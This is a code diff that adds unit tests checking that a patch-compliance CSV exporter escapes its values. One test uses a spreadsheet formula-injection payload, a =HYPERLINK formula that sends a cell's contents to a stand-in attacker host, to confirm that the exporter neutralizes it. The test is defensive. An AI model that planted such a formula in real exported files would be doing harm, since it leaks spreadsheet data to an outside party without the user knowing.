@@ -144,6 +144,7 @@ import { db, withSystemDbAccessContext } from '../db';
 import { writeFile } from 'node:fs/promises';
 import {
   enqueuePatchComplianceReport,
+  formatComplianceCsv,
   processPatchComplianceReportJob,
 } from './patchComplianceReportWorker';
 
@@ -384,5 +385,45 @@ describe('patch compliance report worker authority', () => {
       name: 'generate-compliance-report',
       data: { type: 'generate-compliance-report', reportId: REPORT_ID },
     }]);
+  });
+});
+
+describe('formatComplianceCsv', () => {
+  const summary = {
+    total: 3,
+    installed: 2,
+    pending: 1,
+    failed: 0,
+    missing: 0,
+    skipped: 0,
+    compliancePercent: 66.7,
+  };
+
+  // The compliance CSV used to hand-roll `${metric},${JSON.stringify(...)}`,
+  // bypassing the shared escaper, so a value with a leading formula trigger was
+  // emitted verbatim.
+  it('neutralizes a =HYPERLINK payload in a metric value', () => {
+    const csv = formatComplianceCsv(
+      '=HYPERLINK("https://evil.example/?c="&A1,"x")',
+      ORG_ID,
+      null,
+      null,
+      summary,
+    );
+
+    const reportIdLine = csv.split('\n').find((line) => line.startsWith('"report_id"'))!;
+    expect(reportIdLine).toBe(
+      `"report_id","'=HYPERLINK(""https://evil.example/?c=""&A1,""x"")"`,
+    );
+    expect(csv).not.toContain(',"=HYPERLINK');
+  });
+
+  it('escapes the header row and every metric name', () => {
+    const csv = formatComplianceCsv(REPORT_ID, ORG_ID, null, null, summary);
+    const lines = csv.split('\n');
+    expect(lines[0]).toBe('"metric","value"');
+    expect(lines).toContain(`"org_id","${ORG_ID}"`);
+    expect(lines).toContain('"compliance_percent","66.7"');
+    expect(lines).toContain('"source","all"');
   });
 });
